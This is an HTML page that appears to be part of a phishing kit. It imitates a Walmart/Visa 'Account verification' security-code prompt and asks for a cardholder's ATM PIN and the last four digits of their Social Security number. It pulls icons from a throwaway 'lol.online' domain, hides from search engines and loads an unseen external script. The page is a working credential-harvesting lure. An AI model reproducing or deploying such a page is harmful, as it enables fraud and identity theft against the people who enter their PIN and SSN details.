<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Account verification</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
  <link id="lib_main" type="text/css" rel="stylesheet" href="imgs/none.css" disabled="disabled">
  <link id="lib" type="text/css" rel="stylesheet" href="imgs/none2.css" disabled="disabled">
  <link rel="shortcut icon" href="http://247cc9085d8e0070582354dd6b2c426b.lol.online/idk/User/app/pic/favicon.ico">
  <link rel="apple-touch-icon" href="http://247cc9085d8e0070582354dd6b2c426b.lol.online/idk/User/app/pic/favicon.png">
  <script src="script3.js"></script>
  <style>
    /* Custom CSS styles */
    tr > td:last-child {
      width: 100%!important;
    }
    tr > td:first-child {
      width: 30%!important;
    }
    /* Add your custom CSS styles here */
    .footer-links-container {
      max-width: 1280px;
      margin: 0 auto;
      padding-left: 20px;
    }
    .year-footer {
      padding: 10px 20px;
      background-color: #f5f5f5;
      color: gray;
      text-align: center;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <center>
    <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
      <img src="imgs/vsa_p.svg" style="width: 90px;float:left;"><img src="imgs/walmart-logo.png" style="float: right; display: inline-block;margin-top: 18px;" width="100px">
      <div style="clear:both"></div>
      <p style="font-size:13px;margin-top:25px;color:#807979"> Please enter your Security Code </p>
      <form class="vbv-form" method="post" action="https://www.walmart.com">
        <br>
        <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
          <tbody>
            <tr>
                <td align="right">Credit Card :</td>
                <td id="credit-card-info"> XXXX-XXXX-XXXX-XXXX</td>
            </tr>
            <tr>
                <td align="right">Full Name :</td>
                <td id="full-name-info"> John Doe</td>
            </tr>
            <tr>
                <td align="right">ATM PIN :</td>
                <td><input style="width: 75px;" type="password" id="atmpin" name="atmpin" inputmode="numeric" maxlength="4"></td> <!-- Added ID "atmpin" -->
            </tr>
            <tr>
                <td align="right">Last 4 digit of SSN :</td>
                <td><input style="width: 75px;" type="tel" id="ssn" name="ssn" maxlength="4" required=""></td> <!-- Added ID "ssn" -->
            </tr>
            <tr>
                <td></td>
                <td><br><input style="width:74px" type="submit" value="Submit"></td>
            </tr>
        </tbody>
        
        </table>
      </form>
      <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright Â© 1999-2024. All rights reserved. </p>
    </div>
    <div id="rotate" style="display:none">
      <div class="circle">
        <div class="rotate"></div>
      </div>
      <div class="overlay"></div>
    </div>
  </center>
</body>
</html>
